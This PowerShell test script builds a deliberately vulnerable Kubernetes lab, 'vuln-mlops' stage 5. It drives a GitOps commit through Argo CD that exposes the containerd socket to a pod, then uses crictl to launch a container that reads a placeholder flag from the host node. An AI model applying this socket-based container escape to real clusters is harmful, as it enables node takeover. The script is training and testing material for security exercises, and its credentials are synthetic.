param([string]$KindCommand = "kind")

$ErrorActionPreference = "Stop"
$root = (Resolve-Path (Join-Path $PSScriptRoot "..")).Path
$name = "stage-05-$PID"
$tmp = Join-Path ([IO.Path]::GetTempPath()) "vuln-mlops-$name"
$audit = Join-Path $tmp "audit"
$nodeProof = Join-Path $tmp "stage-05-proof"
$config = Join-Path $tmp "kind.yaml"
$portLog = Join-Path $tmp "port-forward.log"
$portErrorLog = Join-Path $tmp "port-forward-error.log"
$runtimeImageTar = Join-Path $tmp "runtime-builder-image.tar"
$nodeImage = "kindest/node:v1.37.0@sha256:a1ed56cfb0e7b93589bdf97c8cd566405a265939e3620fc4f5de89adff580ae5"
$proofImage = "docker.io/library/debian:bookworm-slim@sha256:3783cc01769c7b2b1b83a5c5ad96c815348e28ed7da68e2e3687004faa906251"
$controller = "system:serviceaccount:stage-04-gitops:argocd-application-controller"

New-Item -ItemType Directory -Force $audit | Out-Null
Set-Content -LiteralPath $nodeProof -Value "FLAG{stage_5_node_placeholder}" -Encoding utf8NoBOM
$auditPolicy = (Resolve-Path (Join-Path $root "lab/stages/stage-05-runtime/audit-policy.yaml")).Path

@"
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
networking: {serviceSubnet: 10.96.0.0/12}
nodes:
  - role: control-plane
    extraMounts:
      - {hostPath: '$auditPolicy', containerPath: /etc/kubernetes/stage-05-audit.yaml, readOnly: true}
      - {hostPath: '$audit', containerPath: /var/log/kubernetes}
    kubeadmConfigPatches:
      - |
        kind: ClusterConfiguration
        apiServer:
          extraArgs:
            audit-policy-file: /etc/kubernetes/stage-05-audit.yaml
            audit-log-path: /var/log/kubernetes/audit.log
          extraVolumes:
            - {name: audit-policy, hostPath: /etc/kubernetes/stage-05-audit.yaml, mountPath: /etc/kubernetes/stage-05-audit.yaml, readOnly: true, pathType: File}
            - {name: audit-log, hostPath: /var/log/kubernetes, mountPath: /var/log/kubernetes, pathType: DirectoryOrCreate}
  - role: worker
    extraMounts:
      - {hostPath: '$nodeProof', containerPath: /var/lib/vuln-mlops/stage-05-proof, readOnly: true}
"@ | Set-Content -LiteralPath $config -Encoding utf8NoBOM

function Run([scriptblock]$Command) {
  & $Command
  if($LASTEXITCODE -ne 0) { throw "command failed with exit code $LASTEXITCODE" }
}

function Assert-PatchDenied([string]$Description, [string]$Patch) {
  $output = (& kubectl patch deployment runtime-builder -n stage-05-runtime --type=json "--patch=$Patch" --dry-run=server "--as=$controller" 2>&1 | Out-String)
  if($LASTEXITCODE -eq 0 -or $output -notmatch "denied|forbidden|fixed|escape|allowed|invalid value") {
    throw "shortcut unexpectedly accepted: $Description`n$output"
  }
}

$pf = $null
try {
  Run { & $KindCommand create cluster --name $name --image $nodeImage --config $config }
  $apiReady = $false
  foreach($i in 1..24) {
    kubectl get nodes 2>$null | Out-Null
    if($LASTEXITCODE -eq 0) { $apiReady = $true; break }
    Start-Sleep 5
  }
  if(-not $apiReady) { throw "Kubernetes API did not become ready" }
  Run { kubectl wait --for=condition=Ready nodes --all --timeout=240s }
  Run { kubectl taint node "$name-control-plane" node-role.kubernetes.io/control-plane:NoSchedule- }
  Run { kubectl label node "$name-control-plane" lab.vuln-mlops/node-role=general --overwrite }
  Run { kubectl label node "$name-worker" lab.vuln-mlops/node-role=escape --overwrite }
  Run { kubectl taint node "$name-worker" lab.vuln-mlops/escape=true:NoSchedule }
  Run { docker save --output $runtimeImageTar debian:bookworm-slim }
  Run { docker exec "${name}-worker" mkdir -p /var/lib/stage5 }
  Run { docker cp $runtimeImageTar "${name}-worker:/var/lib/stage5/runtime-builder-image.tar" }
  Run { docker exec "${name}-worker" test -s /var/lib/stage5/runtime-builder-image.tar }
  Run { docker exec "${name}-worker" ctr --namespace=k8s.io images import --platform=linux/amd64 --digests --snapshotter=overlayfs /var/lib/stage5/runtime-builder-image.tar }
  Run { docker exec "${name}-worker" rm -f /var/lib/stage5/runtime-builder-image.tar }
  Remove-Item -LiteralPath $runtimeImageTar -Force

  Run { kubectl apply -f (Join-Path $root "lab/stages/stage-04-gitops/vendor/application-crd-v3.5.3.yaml") --server-side }
  Run { kubectl apply -f (Join-Path $root "lab/stages/stage-04-gitops/vendor/appproject-crd-v3.5.3.yaml") --server-side }
  Run { kubectl apply -f (Join-Path $root "lab/stages/stage-04-gitops/vendor/applicationset-crd-v3.5.3.yaml") --server-side }
  Run { kubectl wait --for=condition=Established crd/applications.argoproj.io crd/appprojects.argoproj.io --timeout=120s }
  Run { kubectl apply -k (Join-Path $root "lab/stages/stage-05-runtime") --server-side }

  foreach($workload in @(
    "deployment/gitea",
    "deployment/argocd-repo-server",
    "deployment/argocd-redis",
    "statefulset/argocd-application-controller"
  )) {
    kubectl rollout status $workload -n stage-04-gitops --timeout=600s
    if($LASTEXITCODE -ne 0) {
      kubectl get pods -A -o wide
      kubectl describe $workload -n stage-04-gitops
      throw "$workload rollout failed"
    }
  }
  Run { kubectl rollout status deployment/runtime-builder -n stage-05-runtime --timeout=300s }

  $runtimeNode = (kubectl get pod -n stage-05-runtime -l app=runtime-builder -o jsonpath='{.items[0].spec.nodeName}').Trim()
  if($runtimeNode -ne "$name-worker") { throw "runtime-builder escaped the dedicated node: $runtimeNode" }
  Run { docker exec "$name-control-plane" test ! -e /var/lib/vuln-mlops/stage-05-proof }

  foreach($check in @(
    @("create", "deployments.apps"),
    @("create", "pods"),
    @("create", "secrets"),
    @("delete", "deployments.apps")
  )) {
    $answer = (kubectl auth can-i @check -n stage-05-runtime "--as=$controller").Trim()
    if($answer -ne "no") { throw "Argo shortcut allowed: $($check -join ' ')" }
  }
  if((kubectl auth can-i update deployment/runtime-builder -n stage-05-runtime "--as=$controller").Trim() -ne "yes") {
    throw "Argo cannot update the intended runtime-builder"
  }
  if((kubectl auth can-i update deployment/other-workload -n stage-05-runtime "--as=$controller").Trim() -ne "no") {
    throw "Argo can update another workload"
  }

  Assert-PatchDenied "move to general node" '[{"op":"replace","path":"/spec/template/spec/nodeSelector/lab.vuln-mlops~1node-role","value":"general"}]'
  Assert-PatchDenied "change hostPath" '[{"op":"replace","path":"/spec/template/spec/volumes/0/hostPath/path","value":"/run/containerd/other.sock"}]'
  Assert-PatchDenied "enable privileged" '[{"op":"add","path":"/spec/template/spec/containers/0/securityContext/privileged","value":true}]'

  Run { kubectl exec -n stage-04-gitops deploy/gitea -- gitea admin user create --config /etc/gitea/app.ini --username stage3-lab-writer --password SYNTHETIC_STAGE3_GIT_TOKEN --email lab@example.invalid --must-change-password=false }
  $pf = Start-Process kubectl -ArgumentList @("port-forward", "-n", "stage-04-gitops", "svc/gitea", "33001:3000") -RedirectStandardOutput $portLog -RedirectStandardError $portErrorLog -WindowStyle Hidden -PassThru
  $healthy = $false
  foreach($i in 1..30) {
    try { Invoke-RestMethod http://127.0.0.1:33001/api/healthz | Out-Null; $healthy = $true; break }
    catch { Start-Sleep 1 }
  }
  if(-not $healthy) { throw "Gitea port-forward did not become healthy" }

  $auth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("stage3-lab-writer:SYNTHETIC_STAGE3_GIT_TOKEN"))
  Invoke-RestMethod http://127.0.0.1:33001/api/v1/user/repos -Method Post -Headers @{Authorization="Basic $auth"} -ContentType application/json -Body '{"name":"vuln-mlops-gitops","private":true}' | Out-Null
  $giteaPod = (kubectl get pod -n stage-04-gitops -l app=gitea -o jsonpath='{.items[0].metadata.name}').Trim()
  $hook = [Convert]::ToBase64String([IO.File]::ReadAllBytes((Join-Path $root "lab/stages/stage-04-gitops/scope-hook.sh")))
  Run { kubectl exec -n stage-04-gitops $giteaPod -- sh -c "mkdir -p /var/lib/gitea/git/repositories/stage3-lab-writer/vuln-mlops-gitops.git/hooks/pre-receive.d; echo $hook | base64 -d > /var/lib/gitea/git/repositories/stage3-lab-writer/vuln-mlops-gitops.git/hooks/pre-receive.d/scope; chmod 755 /var/lib/gitea/git/repositories/stage3-lab-writer/vuln-mlops-gitops.git/hooks/pre-receive.d/scope" }

  $repo = Join-Path $tmp "repo"
  New-Item -ItemType Directory -Force (Join-Path $repo "runtime-builder") | Out-Null
  Copy-Item (Join-Path $root "lab/stages/stage-05-runtime/runtime-builder-base.yaml") (Join-Path $repo "runtime-builder/deployment.yaml")
  Push-Location $repo
  Run { git init -b stage4-lab }
  Run { git config user.email lab@example.invalid }
  Run { git config user.name stage3-lab-writer }
  Run { git add . }
  Run { git commit -m baseline }
  Run { git remote add origin "http://stage3-lab-writer:SYNTHETIC_STAGE3_GIT_TOKEN@127.0.0.1:33001/stage3-lab-writer/vuln-mlops-gitops.git" }
  Run { git push -u origin stage4-lab }
  Copy-Item (Join-Path $root "lab/stages/stage-05-runtime/repository/runtime-builder/deployment.yaml") (Join-Path $repo "runtime-builder/deployment.yaml") -Force
  Run { git add . }
  Run { git commit -m 'enable runtime path' }
  $sha = (git rev-parse HEAD).Trim()
  Run { git push origin stage4-lab }
  Pop-Location

  $reconciled = $false
  foreach($i in 1..80) {
    $deployment = kubectl get deployment runtime-builder -n stage-05-runtime -o json | ConvertFrom-Json
    $mode = ($deployment.spec.template.spec.containers[0].env | Where-Object name -eq STAGE5_MODE).value
    if($mode -eq "runtime-socket") { $reconciled = $true; break }
    Start-Sleep 3
  }
  if(-not $reconciled) {
    kubectl get application runtime-builder -n stage-04-gitops -o yaml
    throw "Argo did not reconcile the Stage 5 desired state"
  }
  Run { kubectl rollout status deployment/runtime-builder -n stage-05-runtime --timeout=300s }

  $runtimePods = (kubectl get pod -n stage-05-runtime -l app=runtime-builder -o json | ConvertFrom-Json).items
  $runtimePodObject = @($runtimePods | Where-Object {
    -not $_.metadata.deletionTimestamp -and $_.status.containerStatuses[0].ready
  } | Sort-Object { [DateTime]$_.metadata.creationTimestamp } -Descending)[0]
  if(-not $runtimePodObject) { throw "no current Ready runtime-builder Pod was found" }
  $runtimePod = $runtimePodObject.metadata.name
  $runtimePodUid = $runtimePodObject.metadata.uid
  $runtimeNode = $runtimePodObject.spec.nodeName
  if($runtimeNode -ne "$name-worker") { throw "reconciled runtime-builder moved nodes: $runtimeNode" }

  if($pf) { Stop-Process -Id $pf.Id -Force -ErrorAction SilentlyContinue; $pf = $null }
  Run { kubectl scale deployment/gitea deployment/argocd-repo-server deployment/argocd-redis -n stage-04-gitops --replicas=0 }
  Run { kubectl scale statefulset/argocd-application-controller -n stage-04-gitops --replicas=0 }
  Start-Sleep 10

  $podConfig = @{
    metadata = @{name=$runtimePod; namespace="stage-05-runtime"; uid=$runtimePodUid; attempt=0}
    log_directory = "/tmp"
    linux = @{cgroup_parent="system.slice"}
  } | ConvertTo-Json -Depth 8 -Compress
  $containerConfig = @{
    metadata = @{name="runtime-builder"; attempt=1}
    image = @{image=$proofImage}
    command = @("sh", "-c", "cp /proof/stage-05-proof /out/stage5-proof")
    log_path = "stage5-node-proof.log"
    mounts = @(
      @{container_path="/proof"; host_path="/var/lib/vuln-mlops"; readonly=$true},
      @{container_path="/out"; host_path="/var/lib/kubelet/pods/$runtimePodUid/volumes/kubernetes.io~empty-dir/tmp"; readonly=$false}
    )
    linux = @{security_context=@{privileged=$false}}
  } | ConvertTo-Json -Depth 8 -Compress
  $podConfig64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($podConfig))
  $containerConfig64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($containerConfig))
  Run { kubectl exec -n stage-05-runtime $runtimePod -- sh -c "echo $podConfig64 | base64 -d > /tmp/stage5-pod.json; echo $containerConfig64 | base64 -d > /tmp/stage5-container.json" }

  $cri = @("--runtime-endpoint=unix:///run/stage5/containerd.sock", "--image-endpoint=unix:///run/stage5/containerd.sock", "--timeout=120s")
  Run { $null = kubectl exec -n stage-05-runtime $runtimePod -- crictl @cri pull $proofImage }
  $sandboxList = (kubectl exec -n stage-05-runtime $runtimePod -- crictl @cri pods --output json | Out-String | ConvertFrom-Json).items
  $sandboxId = @($sandboxList | Where-Object {$_.metadata.name -eq $runtimePod -and $_.state -eq "SANDBOX_READY"})[0].id
  if($LASTEXITCODE -ne 0 -or -not $sandboxId) { throw "runtime-builder CRI sandbox discovery failed" }
  $containerId = (kubectl exec -n stage-05-runtime $runtimePod -- crictl @cri create $sandboxId /tmp/stage5-container.json /tmp/stage5-pod.json | Out-String).Trim()
  if($LASTEXITCODE -ne 0 -or -not $containerId) { throw "CRI proof container creation failed" }
  Run { $null = kubectl exec -n stage-05-runtime $runtimePod -- crictl @cri start $containerId }
  $proof = ""
  foreach($i in 1..20) {
    $proof = (kubectl exec -n stage-05-runtime $runtimePod -- sh -c "cat /tmp/stage5-proof 2>/dev/null || true" | Out-String).Trim()
    if($proof -eq "FLAG{stage_5_node_placeholder}") { break }
    Start-Sleep -Milliseconds 100
  }
  if($proof -ne "FLAG{stage_5_node_placeholder}") { throw "node proof was not obtained through containerd CRI: $proof" }
  $runtimeAudit = (docker exec "$name-worker" sh -c "journalctl -u containerd --no-pager -n 120" | Out-String)
  $containerPrefix = $containerId.Substring(0, 12)
  if($runtimeAudit -notmatch [Regex]::Escape($containerPrefix) -or $runtimeAudit -notmatch 'StartContainer') {
    throw "containerd CRI operation evidence is missing"
  }
  kubectl exec -n stage-05-runtime $runtimePod -- crictl @cri rm $containerId 2>$null | Out-Null

  $podInventory = kubectl get pods -A -o json | ConvertFrom-Json
  $socketPods = @($podInventory.items | Where-Object {
    -not $_.metadata.deletionTimestamp -and
    ($_.spec.volumes | Where-Object { $_.hostPath.path -eq "/run/containerd/containerd.sock" })
  })
  if($socketPods.Count -ne 1 -or $socketPods[0].metadata.namespace -ne "stage-05-runtime" -or $socketPods[0].metadata.name -ne $runtimePod) {
    throw "containerd socket exposed outside runtime-builder"
  }

  $auditRecords = @(docker exec "$name-control-plane" sh -c "cat /var/log/kubernetes/audit.log" | ForEach-Object { $_ | ConvertFrom-Json })
  $execAudit = @($auditRecords | Where-Object {
    $_.objectRef.namespace -eq "stage-05-runtime" -and
    $_.objectRef.resource -eq "pods" -and
    $_.objectRef.subresource -eq "exec"
  })
  if($execAudit.Count -eq 0) { throw "Kubernetes exec audit evidence is missing" }
  Write-Output "Stage 5 Git commit $sha reached escape node $runtimeNode; containerd CRI proof and operation evidence verified."
}
finally {
  if($pf) { Stop-Process -Id $pf.Id -Force -ErrorAction SilentlyContinue }
  if((Get-Location).Path -like "$tmp*") { Pop-Location }
  & $KindCommand delete cluster --name $name 2>$null | Out-Null
  Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue
}
